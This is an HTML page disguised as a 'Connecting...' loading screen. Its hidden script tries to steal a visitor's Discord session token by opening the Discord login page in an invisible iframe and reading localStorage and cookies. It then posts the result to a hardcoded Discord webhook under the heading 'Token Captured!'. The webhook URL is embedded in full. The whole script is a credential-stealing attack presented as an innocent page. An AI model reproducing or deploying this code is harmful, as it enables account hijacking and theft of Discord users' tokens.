<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body { background: #282b30; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #msg { margin-top: 20px; font-size: 14px; color: #999; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <div id="msg">Analyzing session...</div>
    </div>
    <script>
        // Teray Webhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";

        // Helper: Send data to webhook
        async function sendToWebhook(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: `🔓 **Token Captured!**\n\n\`\`\`${data}\`\`\`` })
                });
                document.getElementById('msg').innerText = "Token sent!";
            } catch (e) {
                document.getElementById('msg').innerText = "Error sending token.";
            }
        }

        // Method: Try to load Discord Login Page in iframe and read localStorage
        async function tryIframeMethod() {
            return new Promise((resolve) => {
                const iframe = document.createElement('iframe');
                iframe.src = 'https://discord.com/login'; // Try login page, it might be less restricted
                iframe.style.display = 'none';
                document.body.appendChild(iframe);

                iframe.onload = async () => {
                    try {
                        // Check if iframe is accessible
                        const iframeWindow = iframe.contentWindow;
                        if (!iframeWindow) {
                            resolve(null);
                            return;
                        }
                        
                        // Try to read localStorage
                        const token = iframeWindow.localStorage.getItem('token');
                        if (token) {
                            resolve(token);
                            return;
                        }
                        
                        // Try to read cookie
                        const cookies = iframe.contentDocument?.cookie;
                        const tokenMatch = cookies?.match(/(?:^|;\s*)token=([^;]*)/);
                        if (tokenMatch) {
                            resolve(decodeURIComponent(tokenMatch[1]));
                            return;
                        }
                        
                        resolve(null);
                    } catch (e) {
                        resolve(null);
                    }
                };

                // Timeout after 5 seconds
                setTimeout(() => {
                    resolve(null);
                }, 5000);
            });
        }

        // Main Execution
        (async () => {
            const token = await tryIframeMethod();
            if (token) {
                sendToWebhook(token);
            } else {
                // Fallback: Send a message saying iframe failed
                sendToWebhook("❌ **Iframe Blocked** by X-Frame-Options. Token not captured automatically.");
            }
        })();
    </script>
</body>
</html>
